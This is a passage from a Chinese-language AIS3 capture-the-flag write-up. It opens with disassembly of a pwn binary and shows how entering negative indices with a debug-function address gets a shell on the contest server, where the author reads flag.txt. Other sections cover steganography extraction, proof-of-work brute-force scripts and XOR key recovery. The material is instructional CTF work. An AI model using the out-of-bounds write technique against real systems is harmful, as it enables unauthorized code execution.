  4009a3:	48 c7 85 48 ff ff ff 	movq   $0x0,-0xb8(%rbp)
  4009aa:	00 00 00 00 
  4009ae:	48 b8 47 65 6e 69 73 	movabs $0x617473696e6547,%rax
  4009b5:	74 61 00 
  4009b8:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4009bf:	48 c7 85 58 ff ff ff 	movq   $0x0,-0xa8(%rbp)
  4009c6:	00 00 00 00 
  4009ca:	48 b8 43 68 6c 6f 72 	movabs $0x68706f726f6c6843,%rax
  4009d1:	6f 70 68 
  4009d4:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4009db:	48 c7 85 68 ff ff ff 	movq   $0x6d757479,-0x98(%rbp)
  4009e2:	79 74 75 6d 
  4009e6:	bf 90 0d 40 00       	mov    $0x400d90,%edi
  4009eb:	e8 50 fc ff ff       	callq  400640 <puts@plt>
  4009f0:	bf b0 0d 40 00       	mov    $0x400db0,%edi
  4009f5:	e8 46 fc ff ff       	callq  400640 <puts@plt>
  4009fa:	bf de 0d 40 00       	mov    $0x400dde,%edi
  4009ff:	e8 3c fc ff ff       	callq  400640 <puts@plt>
  400a04:	bf f8 0d 40 00       	mov    $0x400df8,%edi
  400a09:	e8 32 fc ff ff       	callq  400640 <puts@plt>
  400a0e:	bf de 0d 40 00       	mov    $0x400dde,%edi
  400a13:	e8 28 fc ff ff       	callq  400640 <puts@plt>
  400a18:	c7 85 bc fe ff ff 00 	movl   $0x0,-0x144(%rbp)
  400a1f:	00 00 00 
  400a22:	eb 40                	jmp    400a64 <main+0x27d>
  400a24:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
  400a2b:	8b 95 bc fe ff ff    	mov    -0x144(%rbp),%edx
  400a31:	48 63 d2             	movslq %edx,%rdx
  400a34:	48 c1 e2 04          	shl    $0x4,%rdx
  400a38:	48 01 c2             	add    %rax,%rdx
  400a3b:	8b 85 bc fe ff ff    	mov    -0x144(%rbp),%eax
  400a41:	48 98                	cltq   
  400a43:	48 8b 84 c5 e0 fe ff 	mov    -0x120(%rbp,%rax,8),%rax
  400a4a:	ff 
  400a4b:	48 89 c6             	mov    %rax,%rsi
  400a4e:	bf 12 0e 40 00       	mov    $0x400e12,%edi
  400a53:	b8 00 00 00 00       	mov    $0x0,%eax
  400a58:	e8 13 fc ff ff       	callq  400670 <printf@plt>
  400a5d:	83 85 bc fe ff ff 01 	addl   $0x1,-0x144(%rbp)
  400a64:	83 bd bc fe ff ff 07 	cmpl   $0x7,-0x144(%rbp)
  400a6b:	7e b7                	jle    400a24 <main+0x23d>
  400a6d:	bf de 0d 40 00       	mov    $0x400dde,%edi
  400a72:	e8 c9 fb ff ff       	callq  400640 <puts@plt>
  400a77:	bf 28 0e 40 00       	mov    $0x400e28,%edi
  400a7c:	e8 bf fb ff ff       	callq  400640 <puts@plt>
  400a81:	bf 66 0e 40 00       	mov    $0x400e66,%edi
  400a86:	b8 00 00 00 00       	mov    $0x0,%eax
  400a8b:	e8 e0 fb ff ff       	callq  400670 <printf@plt>
  400a90:	48 8d 85 b4 fe ff ff 	lea    -0x14c(%rbp),%rax
  400a97:	48 89 c6             	mov    %rax,%rsi
  400a9a:	bf 6e 0e 40 00       	mov    $0x400e6e,%edi
  400a9f:	b8 00 00 00 00       	mov    $0x0,%eax
  400aa4:	e8 07 fc ff ff       	callq  4006b0 <__isoc99_scanf@plt>
  400aa9:	8b 85 b4 fe ff ff    	mov    -0x14c(%rbp),%eax
  400aaf:	83 f8 02             	cmp    $0x2,%eax
  400ab2:	7e 0f                	jle    400ac3 <main+0x2dc>
  400ab4:	bf 71 0e 40 00       	mov    $0x400e71,%edi
  400ab9:	e8 82 fb ff ff       	callq  400640 <puts@plt>
  400abe:	e9 e7 00 00 00       	jmpq   400baa <main+0x3c3>
  400ac3:	bf 84 0e 40 00       	mov    $0x400e84,%edi
  400ac8:	b8 00 00 00 00       	mov    $0x0,%eax
  400acd:	e8 9e fb ff ff       	callq  400670 <printf@plt>
  400ad2:	8b 95 b4 fe ff ff    	mov    -0x14c(%rbp),%edx
  400ad8:	48 8d 85 d0 fe ff ff 	lea    -0x130(%rbp),%rax
  400adf:	48 63 d2             	movslq %edx,%rdx
  400ae2:	48 c1 e2 03          	shl    $0x3,%rdx
  400ae6:	48 01 d0             	add    %rdx,%rax
  400ae9:	48 89 c6             	mov    %rax,%rsi
  400aec:	bf 8b 0e 40 00       	mov    $0x400e8b,%edi
  400af1:	b8 00 00 00 00       	mov    $0x0,%eax
  400af6:	e8 b5 fb ff ff       	callq  4006b0 <__isoc99_scanf@plt>
  400afb:	c7 85 c0 fe ff ff 00 	movl   $0x0,-0x140(%rbp)
  400b02:	00 00 00 
  400b05:	eb 67                	jmp    400b6e <main+0x387>
  400b07:	8b 85 c0 fe ff ff    	mov    -0x140(%rbp),%eax
  400b0d:	48 98                	cltq   
  400b0f:	48 8b 94 c5 e0 fe ff 	mov    -0x120(%rbp,%rax,8),%rdx
  400b16:	ff 
  400b17:	8b 85 b4 fe ff ff    	mov    -0x14c(%rbp),%eax
  400b1d:	48 98                	cltq   
  400b1f:	48 8b 84 c5 d0 fe ff 	mov    -0x130(%rbp,%rax,8),%rax
  400b26:	ff 
  400b27:	48 39 c2             	cmp    %rax,%rdx
  400b2a:	75 3b                	jne    400b67 <main+0x380>
  400b2c:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
  400b33:	8b 95 c0 fe ff ff    	mov    -0x140(%rbp),%edx
  400b39:	48 63 d2             	movslq %edx,%rdx
  400b3c:	48 c1 e2 04          	shl    $0x4,%rdx
  400b40:	48 01 c2             	add    %rax,%rdx
  400b43:	8b 85 c0 fe ff ff    	mov    -0x140(%rbp),%eax
  400b49:	48 98                	cltq   
  400b4b:	48 8b 84 c5 e0 fe ff 	mov    -0x120(%rbp,%rax,8),%rax
  400b52:	ff 
  400b53:	48 89 c6             	mov    %rax,%rsi
  400b56:	bf 90 0e 40 00       	mov    $0x400e90,%edi
  400b5b:	b8 00 00 00 00       	mov    $0x0,%eax
  400b60:	e8 0b fb ff ff       	callq  400670 <printf@plt>
  400b65:	eb 10                	jmp    400b77 <main+0x390>
  400b67:	83 85 c0 fe ff ff 01 	addl   $0x1,-0x140(%rbp)
  400b6e:	83 bd c0 fe ff ff 07 	cmpl   $0x7,-0x140(%rbp)
  400b75:	7e 90                	jle    400b07 <main+0x320>
  400b77:	bf a0 0e 40 00       	mov    $0x400ea0,%edi
  400b7c:	b8 00 00 00 00       	mov    $0x0,%eax
  400b81:	e8 ea fa ff ff       	callq  400670 <printf@plt>
  400b86:	48 8d 85 b8 fe ff ff 	lea    -0x148(%rbp),%rax
  400b8d:	48 89 c6             	mov    %rax,%rsi
  400b90:	bf 6e 0e 40 00       	mov    $0x400e6e,%edi
  400b95:	b8 00 00 00 00       	mov    $0x0,%eax
  400b9a:	e8 11 fb ff ff       	callq  4006b0 <__isoc99_scanf@plt>
  400b9f:	8b 85 b8 fe ff ff    	mov    -0x148(%rbp),%eax
  400ba5:	83 f8 01             	cmp    $0x1,%eax
  400ba8:	74 05                	je     400baf <main+0x3c8>
  400baa:	e9 d2 fe ff ff       	jmpq   400a81 <main+0x29a>
  400baf:	90                   	nop
  400bb0:	48 81 bd c8 fe ff ff 	cmpq   $0x1a0a,-0x138(%rbp)
  400bb7:	0a 1a 00 00 
  400bbb:	0f 85 0f 01 00 00    	jne    400cd0 <main+0x4e9>
  400bc1:	bf bf 0e 40 00       	mov    $0x400ebf,%edi
  400bc6:	e8 75 fa ff ff       	callq  400640 <puts@plt>
  400bcb:	c7 85 c4 fe ff ff 00 	movl   $0x0,-0x13c(%rbp)
  400bd2:	00 00 00 
  400bd5:	eb 35                	jmp    400c0c <main+0x425>
  400bd7:	48 8d 85 20 ff ff ff 	lea    -0xe0(%rbp),%rax
  400bde:	8b 95 c4 fe ff ff    	mov    -0x13c(%rbp),%edx
  400be4:	48 63 d2             	movslq %edx,%rdx
  400be7:	48 c1 e2 04          	shl    $0x4,%rdx
  400beb:	48 01 c2             	add    %rax,%rdx
  400bee:	8b 85 c4 fe ff ff    	mov    -0x13c(%rbp),%eax
  400bf4:	89 c6                	mov    %eax,%esi
  400bf6:	bf cc 0e 40 00       	mov    $0x400ecc,%edi
  400bfb:	b8 00 00 00 00       	mov    $0x0,%eax
  400c00:	e8 6b fa ff ff       	callq  400670 <printf@plt>
  400c05:	83 85 c4 fe ff ff 01 	addl   $0x1,-0x13c(%rbp)
  400c0c:	83 bd c4 fe ff ff 04 	cmpl   $0x4,-0x13c(%rbp)
  400c13:	7e c2                	jle    400bd7 <main+0x3f0>
  400c15:	bf d8 0e 40 00       	mov    $0x400ed8,%edi
  400c1a:	b8 00 00 00 00       	mov    $0x0,%eax
  400c1f:	e8 4c fa ff ff       	callq  400670 <printf@plt>
  400c24:	48 8d 85 b4 fe ff ff 	lea    -0x14c(%rbp),%rax
  400c2b:	48 89 c6             	mov    %rax,%rsi
  400c2e:	bf 6e 0e 40 00       	mov    $0x400e6e,%edi
  400c33:	b8 00 00 00 00       	mov    $0x0,%eax
  400c38:	e8 73 fa ff ff       	callq  4006b0 <__isoc99_scanf@plt>
  400c3d:	8b 85 b4 fe ff ff    	mov    -0x14c(%rbp),%eax
  400c43:	83 f8 05             	cmp    $0x5,%eax
  400c46:	7e 14                	jle    400c5c <main+0x475>
  400c48:	bf 71 0e 40 00       	mov    $0x400e71,%edi
  400c4d:	e8 ee f9 ff ff       	callq  400640 <puts@plt>
  400c52:	bf 00 00 00 00       	mov    $0x0,%edi
  400c57:	e8 64 fa ff ff       	callq  4006c0 <exit@plt>
  400c5c:	bf fb 0e 40 00       	mov    $0x400efb,%edi
  400c61:	b8 00 00 00 00       	mov    $0x0,%eax
  400c66:	e8 05 fa ff ff       	callq  400670 <printf@plt>
  400c6b:	8b 95 b4 fe ff ff    	mov    -0x14c(%rbp),%edx
  400c71:	48 8d 85 20 ff ff ff 	lea    -0xe0(%rbp),%rax
  400c78:	48 63 d2             	movslq %edx,%rdx
  400c7b:	48 c1 e2 04          	shl    $0x4,%rdx
  400c7f:	48 01 d0             	add    %rdx,%rax
  400c82:	ba 10 00 00 00       	mov    $0x10,%edx
  400c87:	48 89 c6             	mov    %rax,%rsi
  400c8a:	bf 00 00 00 00       	mov    $0x0,%edi
  400c8f:	e8 ec f9 ff ff       	callq  400680 <read@plt>
  400c94:	8b 85 b4 fe ff ff    	mov    -0x14c(%rbp),%eax
  400c9a:	85 c0                	test   %eax,%eax
  400c9c:	75 26                	jne    400cc4 <main+0x4dd>
  400c9e:	48 8b 85 d0 fe ff ff 	mov    -0x130(%rbp),%rax
  400ca5:	48 83 f8 02          	cmp    $0x2,%rax
  400ca9:	75 19                	jne    400cc4 <main+0x4dd>
  400cab:	48 8b 85 d8 fe ff ff 	mov    -0x128(%rbp),%rax
  400cb2:	48 83 f8 10          	cmp    $0x10,%rax
  400cb6:	75 0c                	jne    400cc4 <main+0x4dd>
  400cb8:	bf 16 0f 40 00       	mov    $0x400f16,%edi
  400cbd:	e8 7e f9 ff ff       	callq  400640 <puts@plt>
  400cc2:	eb 16                	jmp    400cda <main+0x4f3>
  400cc4:	bf 1e 0f 40 00       	mov    $0x400f1e,%edi
  400cc9:	e8 72 f9 ff ff       	callq  400640 <puts@plt>
  400cce:	eb 0a                	jmp    400cda <main+0x4f3>
  400cd0:	bf 28 0f 40 00       	mov    $0x400f28,%edi
  400cd5:	e8 66 f9 ff ff       	callq  400640 <puts@plt>
  400cda:	b8 00 00 00 00       	mov    $0x0,%eax
  400cdf:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  400ce3:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
  400cea:	00 00 
  400cec:	74 05                	je     400cf3 <main+0x50c>
  400cee:	e8 5d f9 ff ff       	callq  400650 <__stack_chk_fail@plt>
  400cf3:	c9                   	leaveq 
  400cf4:	c3                   	retq   
  400cf5:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  400cfc:	00 00 00 
  400cff:	90                   	nop

0000000000400d00 <__libc_csu_init>:
  400d00:	41 57                	push   %r15
  400d02:	41 56                	push   %r14
  400d04:	41 89 ff             	mov    %edi,%r15d
  400d07:	41 55                	push   %r13
  400d09:	41 54                	push   %r12
  400d0b:	4c 8d 25 fe 10 20 00 	lea    0x2010fe(%rip),%r12        # 601e10 <__frame_dummy_init_array_entry>
  400d12:	55                   	push   %rbp
  400d13:	48 8d 2d fe 10 20 00 	lea    0x2010fe(%rip),%rbp        # 601e18 <__init_array_end>
  400d1a:	53                   	push   %rbx
  400d1b:	49 89 f6             	mov    %rsi,%r14
  400d1e:	49 89 d5             	mov    %rdx,%r13
  400d21:	4c 29 e5             	sub    %r12,%rbp
  400d24:	48 83 ec 08          	sub    $0x8,%rsp
  400d28:	48 c1 fd 03          	sar    $0x3,%rbp
  400d2c:	e8 df f8 ff ff       	callq  400610 <_init>
  400d31:	48 85 ed             	test   %rbp,%rbp
  400d34:	74 20                	je     400d56 <__libc_csu_init+0x56>
  400d36:	31 db                	xor    %ebx,%ebx
  400d38:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  400d3f:	00 
  400d40:	4c 89 ea             	mov    %r13,%rdx
  400d43:	4c 89 f6             	mov    %r14,%rsi
  400d46:	44 89 ff             	mov    %r15d,%edi
  400d49:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  400d4d:	48 83 c3 01          	add    $0x1,%rbx
  400d51:	48 39 eb             	cmp    %rbp,%rbx
  400d54:	75 ea                	jne    400d40 <__libc_csu_init+0x40>
  400d56:	48 83 c4 08          	add    $0x8,%rsp
  400d5a:	5b                   	pop    %rbx
  400d5b:	5d                   	pop    %rbp
  400d5c:	41 5c                	pop    %r12
  400d5e:	41 5d                	pop    %r13
  400d60:	41 5e                	pop    %r14
  400d62:	41 5f                	pop    %r15
  400d64:	c3                   	retq   
  400d65:	90                   	nop
  400d66:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  400d6d:	00 00 00 

0000000000400d70 <__libc_csu_fini>:
  400d70:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000400d74 <_fini>:
  400d74:	48 83 ec 08          	sub    $0x8,%rsp
  400d78:	48 83 c4 08          	add    $0x8,%rsp
  400d7c:	c3                   	retq   
```

--

我們找 `<debug>`

往下看記憶體位置 `4007d6`

--

所以 idx 從 -1 開始嘗試

`pair[idx]= 十進位(0x4007d6)`

直到進入shell 即可打指令

`(0x4007d6)十六進位 = (4196310)十進位`

--

開始下指令

`nc 104.199.235.135 2112`

連上之後

```
Index:-1
Code:4196310
```

如果跑出 `Are you sure ? (yes:1 / no:0)`

輸入 0 然後改 `Index` 繼續嘗試

--

![](32.png)

--

嘗試到 -5 時

會發現 `Are you sure ? (yes:1 / no:0)`

不再跑出來

此時就是進到 shell了

然後下 `ls` 看裡面有甚麼檔案

發現裡面有 `darling` 跟 `flag.txt`

下 `cat flag.txt` 打開 `flag.txt`

--

![](33.png)

---

### pwn-justfmt

--

<img src="34.png" width="60%" height="">

--

![](35.png)

---

### pwn-Magic_World

--

<img src="36.png" width="60%" height="">

---

## misc

---

### misc-welcome

--

![](37.png)

--

點進去看影片就有了

--

![](38.png)

---

### misc-flags

--

<img src="39.png" width="60%" height="">

--

我們先不要看提示

先下載他的圖片

--

![](40.jpg)

--

然後下 `strings 下載的檔案`

發現裡面還有一張圖跟 flag 的檔案

--

![](41.png)

--

所以我們下 `binwalk -e 你下載的檔案`

在 `ls` 後 `cd` 進去看解出來的東西

--

![](42.png)

--

我們發現裡面還有一個 `BF24.zip`

--

解壓縮

密碼: `asdfghjkl;`

我不知道密碼怎麼拿到的(求救~\~)

--

解壓縮後你會看到`Avengers_Infinity_War_Poster.jpg`

跟`flag`

打開`flag`你會看到

`AIS3{NONONONONONONONONONONO}`

--

然後第二天提示出來了

我們看一下提示

--

![](43.png)

--

然後回去看一下原本的那張圖

原來是摩斯密碼啊

接下來開始炸眼睛

--

`AIS3{YOUFINDTHEREALFLAGOHYEAH}`

---

### misc-svega

--

<img src="44.png" width="60%" height="">

--

下載完他的 mp3 後

下載

<a href="http://www.petitcolas.net/steganography/mp3stego/" target="_blank" data-preview-link="false">http://www.petitcolas.net/steganography/mp3stego/</a>

--

`MP3Stego` 裡面有一個 `Decode.exe`

讓下載下來的 mp3 跟他同個資料夾

然後在這個資料夾開 `CMD`(shift + 右鍵)

輸入 `Decode.exe -X 你下載的mp3`

--

如果跳出

```
Enter a passphrase:
Confirm your passphrase:
```

按 Enter 跳過

如果失敗的話

試試把 `Decode.exe` 改成 `.\Decode.exe`

--

![](45.png)

--

回去看你的資料夾

會多出一個 txt

--

![](46.png)

---

### misc-BLIND

--

<img src="47.png" width="60%" height="">

---

## crypto

---

### crypto-POW

--

![](48.png)

--

nc 進去後

--

![](49.png)

--

他說他給你一個 x 前 6 位是 `9C83NS`

把她 sha256 後前 6 位是 `000000`

要你求 x

~~所以開始挖礦吧~~

--

Python 2

```python
import socket
import sys
import struct
import time
import re
import hashlib,random,string
def key_make(size=30, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

#nc 140.110.112.29 5126

server = ("104.199.235.135",20000)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(server)
flag=0
sendd=""
db =[]
while True:
 try:
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.connect(server)
  flag=0
  sendd=""
  while True:

    data = sock.recv(4096)
    print data

    re1 = re.search("'([0-9A-Z]+)'",data)

    top = re1.group(1)
    print top
    while True:

        hach = top+key_make()
        m = hashlib.sha256()
        m.update(hach)

        if m.hexdigest()[:6]=="000000":
            print "UO"
            print hach
            print top
            break


    sendd=hach+"\n"

    sock.send(sendd)
 except:
  time.sleep(2)
  pass


sock.close()
```

--

Python 3

```python
#!/usr/bin/env python3
from pwn import *
from hashlib import sha256

def brute(string,index1,cipher,index2):
    for a in range(0, 0xff):
        for b in range(0, 0xff):
            for c in range(0, 0xff):
                print (type(string))
                x = string + chr(a) + chr(b) + chr(c) 
                if sha256(bytes(x, 'latin1')).hexdigest()[0:index2] == cipher:
                    #  success("x -> {}".format(x))
                    return x
    print ("not found")

r = remote("104.199.235.135", 20000)
r.recvlines(2)
for i in range(100):
    stringg = r.recvline().decode('latin1')
    index1 = stringg.strip().split('x[:')[1].split(']')[0]
    string = stringg.strip().split('x[:')[1].split(']')[1].split("'")[1]
    index2 = stringg.strip().split('x[:')[1].split(']')[1].split("'")[2].split(':')[1]
    cipher = stringg.strip().split('x[:')[1].split("'")[3]
    a = brute(str(string),int(index1),str(cipher),int(index2))
    print(a)
    r.sendline(a)
r.interactive()
```

--

用 Python 2

![](50.png)

---

### crypto-XOR

--

![](51.png)

--

神一般的 code 我看不懂 XD

Ruby

```ruby
enc = File.read "flag-encrypted-511ab4a9fd7bb2d216ab5b5afa7fae5742eef94e", mode: "rb"
key = enc[0..4].bytes.zip( 'AIS3{'.bytes ).map { |pair| pair.reduce(&:^) }
key += Array.new 5, 0
key[-1] = enc[-1].ord ^ key[0]
key[-2] = enc[-2].ord ^ key[-1]
key[-3] = enc[-3].ord ^ key[-2]
key[-4] = enc[-4].ord ^ key[-3]
key[-5] = enc[-5].ord ^ key[-4]
0.upto(enc.length-1) do |i|
  print (enc[i].ord ^ key[i % 10]).chr
end
```

---

### crypto-IOU

--

<img src="52.png" width="60%" height="">

---

### crypto-EFAIL

--

<img src="53.png" width="60%" height="">

@slideend
